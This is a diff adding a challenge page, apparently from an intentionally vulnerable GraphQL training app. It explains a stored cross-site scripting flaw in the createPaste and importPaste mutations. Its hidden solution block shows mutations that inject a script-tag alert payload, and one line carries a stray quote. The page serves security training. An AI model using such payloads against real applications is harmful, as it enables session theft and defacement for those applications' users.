@@ -1,0 +1,32 @@
+<!-- Start -->
+<h3 style="color:purple" id="inj-xss"><b>Injection :: Stored Cross Site Scripting</b></h3>
+<hr />
+<h5>Problem Statement</h5>
+<p>
+  The GraphQL mutations <code>createPaste</code> and <code>importPaste</code> allow creating and importing new pastes. The pastes may include any character without any restrictions. The pastes would then render in
+  the Public and Private paste pages, which would result in a Cross Site Scripting vulnerability (XSS).</p>
+<h5>Resources</h5>
+<ul>
+  <li>
+    <a href="https://portswigger.net/web-security/cross-site-scripting/stored" target="_blank">
+      <i class="fa fa-newspaper"></i> PortSwigger - Stored Cross Site Scripting
+    </a>
+  </li>
+</ul>
+<h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-inj-xss')">Show</button></h5>
+<div id="sol-inj-xss" style="display:none">
+  <pre class="bash">
+    # Create New Paste allows special characters that would render in HTML.
+    mutation {
+      createPaste(title:"&lt;script&gt;alert(1)&lt;/script&gt;", content:"zzzz", public:true) {
+        pasteId
+      }
+    }
+
+    # Alternatively, importing a paste that includes Javascript will also result in the same behaviour.
+    mutation {
+      importPaste(host:"localhost", port:80, path:"/xss.html"")
+    }
+  </pre>
+</div>
+<!-- End -->
